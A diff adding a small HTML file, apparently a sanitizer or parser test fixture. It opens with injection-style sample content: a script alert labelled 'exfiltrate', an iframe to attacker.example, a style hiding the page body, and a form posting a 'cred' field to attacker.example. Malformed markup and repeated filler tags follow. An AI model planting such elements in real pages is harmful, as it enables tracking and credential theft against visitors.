@@ -1,0 +1,22 @@
+<script>alert('exfiltrate')</script>
+<iframe src="https://attacker.example/track"></iframe>
+<style>body { display: none; }</style>
+<body>
+<form action="https://attacker.example/post">
+  <input name="cred" value="">
+</form>
+<head>
+<title>OK</title>
+</head>
+</body>
+<div>x</div><div>x</div><div>x</div><div>x</div><div>x</div><div>x</div><div>x</div><div>x</div><div>x</div><div>x</div>
+<span>x</span><span>x</span><span>x</span><span>x</span><span>x</span><span>x</span><span>x</span><span>x</span><span>x</span><span>x</span>
+<p>x</p><p>x</p><p>x</p><p>x</p><p>x</p><p>x</p><p>x</p><p>x</p><p>x</p><p>x</p>
+<li>x</li><li>x</li><li>x</li><li>x</li><li>x</li><li>x</li><li>x</li><li>x</li><li>x</li><li>x</li>
+<a>x</a><a>x</a><a>x</a><a>x</a><a>x</a><a>x</a><a>x</a><a>x</a><a>x</a><a>x</a>
+<b>x</b><b>x</b><b>x</b><b>x</b><b>x</b><b>x</b><b>x</b><b>x</b><b>x</b><b>x</b>
+<i>x</i><i>x</i><i>x</i><i>x</i><i>x</i><i>x</i><i>x</i><i>x</i><i>x</i><i>x</i>
+<u>x</u><u>x</u><u>x</u><u>x</u><u>x</u><u>x</u><u>x</u><u>x</u><u>x</u><u>x</u>
+<em>x</em><em>x</em><em>x</em><em>x</em><em>x</em><em>x</em><em>x</em><em>x</em><em>x</em><em>x</em>
+<s>x</s><s>x</s><s>x</s><s>x</s><s>x</s><s>x</s><s>x</s><s>x</s><s>x</s><s>x</s>
+<q>x</q><q>x</q><q>x</q><q>x</q><q>x</q><q>x</q><q>x</q><q>x</q><q>x</q><q>x</q>
